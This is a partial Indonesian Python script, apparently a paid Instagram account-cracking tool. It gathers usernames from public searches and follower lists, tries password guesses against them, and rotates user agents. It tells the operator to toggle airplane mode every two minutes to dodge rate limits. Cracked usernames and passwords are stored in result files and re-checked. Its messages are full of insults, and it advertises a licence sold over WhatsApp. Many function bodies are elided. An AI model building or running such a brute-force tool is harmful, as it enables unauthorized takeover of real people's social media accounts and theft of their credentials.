...
def login():
	...
	os.system('clear')
	try:
		print(f'\n{M}!{C} Gunakan akun tumbal untuk login tod\n')
	...
	if x.get('status')=='success':
		...
		print(f'\n{H}>{C} Login Sukses tod.....jalankan ulang{M}[{A}python adj-ig.py{M}]')
		os.system('python login.py')
	elif x.get('status')=='checkpoint':
		exit(f'{M}>{C} mampus tumbal cp awokawok')
	else:
		exit(f'{M}!{C} Username atau pasword salah goblok ')
...
class instagram:
 ...
 |_____|_| |_|___/\__\__,_|\__, |_|  \__,_|_| |_| |_| 
                            __/ |                     
                           |___/    \33[32;1mAuthor : Al-Vino                  
\33[1;33m[*]----------------------------------------------
[*]    Sebuah tools untuk henk akun ig:v
[*]    Jangan lupa bahagia:)
[*]----------------------------------------------
\033[96m
[1] Crack dari pencarian nama public         
[2] Crack dari pengikut public               
[3] Crack dari mengikuti public              
[4] Crack ulang hasil crack                  
[5] Check hasil crack                        
\033[91m[6] Bot auto unfollow                        
...
[8] Keluar (ngecroot)
 """)
	def BUG(self):
		print(f"""
 *->{C} Lisensi 1 Bulan / 250K
 *->{C} Anda bisa Beli langsung ke Whatsapp
 *->{C}  {H}[ 083114500777 ]{C}
		""")
		exit()
	...
	def searchAPI(self,cookie,nama):
		try:
			...
			exit(f'\n [{M}!{C}] Koneksi internet lu bermasalah tolol')
		return internal
	...
	def idAPI(self,cookie,id):
		try:
			...
			exit(f"\n [{M}!{C}] Masukan username yang valid tolol pastikan target bersifat publik")
		return idx
	...
	def infoAPI(self,cookie,api,id):
		try:
			...
			print(f'\n [{M}!{C}] Masukan username yang valid tolol')
		return internal

	def passwordAPI(self,xnx):
		print(f'\n [{H}+{C}] Total Username {H}{len(internal)}{C}')
		print(f"""
 [?] Silahkan Pilih Method Crack [?]

 [1] V1 PRO (cepat)
 [2] V2 MBASIC (lambat)
 [3] V3 MOBILE (sangat lambat)
		""")
		c=input(f' {M}==>{C} Pilih 1 - 3 : ')
		if c=='1':
	...
	def generateAPI(self,user,o):
		print(f"""
 [?] Silahkan Pilih UserAgent Anda [?]
 
 [1] USER AGENT - V1
 [2] USER AGENT - V2
 [3] USER AGENT - V3
		""")
		ua=input(f' {U}==>{C} UserAgent : ')
		if ua=='1':
			uaAPI=User_Agent()
		elif ua=='2':
			uaAPI=user_agent()
		...
		print(f"""
 [{H}✓{C}] Hasil OKEY disimpan ke: result/{day}.txt
 [{O}X{C}] Hasil CP disimpan ke: result/{day}.txt

 [{M}!{C}] nyalakan mode pesawat  setiap 2 menit tod
		""")
	...
	def crackAPI(self,user,pas,uaAPI):
		...
		sys.stdout.write(f"\r [Krek] [{K}{loop}/{len(internal)}{C}] {H}[OK :{len(success)}]{C}  {M}[CP :{len(checkpoint)}]{C} "),
		sys.stdout.flush()
		try:
			for pw in pas:
				...
				if "userId" in str(x_jason):
					...
					print(f"""\r{H} ∆–>{C}{H} AL-VINO WOKE
					
  {H}•–>{C} {H}FulNama: {H}{nama}{C}
  ...
  {H}•–>{C} {H} Alhamdulillah
					...
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print(f"""\r  
  {M}∆–>{C} AL-VINO CHECKPOINT 
  
  {M}•–>{C} FulNama: {M}{nama}{C}
  ...
  {H}*->{C} {H}Silahkan Login
				...
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				print(f"""\r  
  {M}*->{C} AWOKAWOK CHEKCPOINT LOGIN
  {M}*->{C} FulName: {M}{nama}{C}
  {M}*->{C} Username: {M}{user}{C}
  {M}*->{C} Password: {M}{pw}{C}
  {M}*->{C} Pengikut: {M}{pengikut}{C}
  {M}*->{C} Mengikuti: {M}{mengikut}{C}
	...
	def menu(self):
		...
		if c=='':
			...
			for i in os.listdir('result'):
				print(f' [{U}>{C}] {i}')
			c=input(f'\n {U}>>>{C} Masukan nama file tod: ')
			g=open("result/%s"%(c)).read().splitlines()
			print(f'\n [{U}+{C}] Total Result Ariandi {H}{len(g)}{C}')
			print(f'\n [{M}!{C}] Proses mengecek status akun. silahkan tunggu sebentar\n')
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				self.checkAPI(usr,pwd)
			exit(f'\n\n [{U}#{C}] proses check selesai tod...')
  ...
  {H}*->{C}{H} Mengikuti : {H}{ful}{C}
			...
			for i in following:
				...
				#print(w)
			input(f'\n\n [{U}#{C}] Unfollow-all selesai tod...');self.menu()
